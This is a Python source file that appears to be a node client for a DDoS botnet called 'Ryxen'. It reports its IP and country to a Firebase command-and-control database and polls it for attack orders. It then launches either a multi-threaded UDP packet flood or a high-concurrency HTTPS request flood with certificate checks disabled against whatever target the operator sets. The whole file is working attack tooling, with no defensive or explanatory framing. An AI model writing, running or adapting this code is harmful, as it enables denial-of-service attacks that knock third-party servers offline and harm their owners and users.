import asyncio, aiohttp, time, random, ssl, socket

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

async def get_node_info():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get('http://ip-api.com/json/', timeout=5) as r:
                data = await r.json()
                return data.get('query', '0.0.0.0'), data.get('countryCode', 'UN')
    except: return "0.0.0.0", "UN"

# --- MOTOR UDP (Para dstats de Gbps) ---
def udp_engine(target_ip, target_port, end_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(1024) 
    while time.time() < end_time:
        try:
            sock.sendto(packet_data, (target_ip, int(target_port)))
        except: pass

# --- MOTOR L7 (Para dstats de RPS/TLS) ---
async def l7_engine(target, end_time, sem):
    ctx = ssl.create_default_context()
    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with sem:
                try:
                    headers = {'User-Agent': f'Ryxen-DStat-{random.randint(100,999)}'}
                    # Fire & Forget: Cerramos rápido para subir los RPS
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close()
                except: continue

async def main():
    ip, cc = await get_node_info()
    nid = f"RX-{cc}-{random.randint(100,999)}"
    
    async with aiohttp.ClientSession() as session:
        await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "ip": ip, "cc": cc, "t": time.time()})
        
        last_s, sem = "", asyncio.Semaphore(8000)
        while True:
            try:
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    method, target, duration = data['method'], data['target'], int(data['time'])
                    if duration <= 0: continue

                    if ".udp" in method:
                        host, port = target.split(':')
                        for _ in range(40): # 40 hilos para forzar el ancho de banda
                            asyncio.create_task(asyncio.to_thread(udp_engine, host, port, time.time() + duration))
                    else:
                        tasks = [l7_engine(target, time.time() + duration, sem) for _ in range(30)]
                        await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
                
